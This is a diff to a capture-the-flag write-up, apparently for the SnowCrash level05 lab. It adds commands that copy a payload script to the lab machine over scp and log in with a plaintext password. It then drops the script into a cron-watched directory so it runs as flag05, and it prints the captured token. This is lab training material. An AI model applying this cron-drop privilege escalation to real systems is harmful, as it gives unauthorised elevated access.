@@ -47,12 +47,19 @@ getflag > /tmp/level05_token 2>&1
 chmod 666 /tmp/level05_token
 ```
 
+`pwn.sh` in this folder is that payload. From the toolbox, copy it over and log in:
+
+```bash
+scp -P 4242 ~/snowcrash/level05/resources/pwn.sh level05@10.0.2.2:/tmp/
+ssh -p 4242 level05@10.0.2.2        # password: ne2searoevaevoem4ov4ar8ap
+```
+
 Drop it in and wait for the clock:
 
 ```bash
-$ cp pwn.sh /opt/openarenaserver/
+$ cp /tmp/pwn.sh /opt/openarenaserver/
 $ while [ ! -f /tmp/level05_token ]; do sleep 1; done; cat /tmp/level05_token
 Check flag.Here is your token : viuaaale9huek52boumoomioc
 ```
 
-The cron fires on the next even minute, runs our script as flag05, and `getflag` writes the token where we can read it. `pwn.sh` in this folder is that payload.
+The cron fires on the next even minute, runs our script as flag05, and `getflag` writes the token where we can read it.
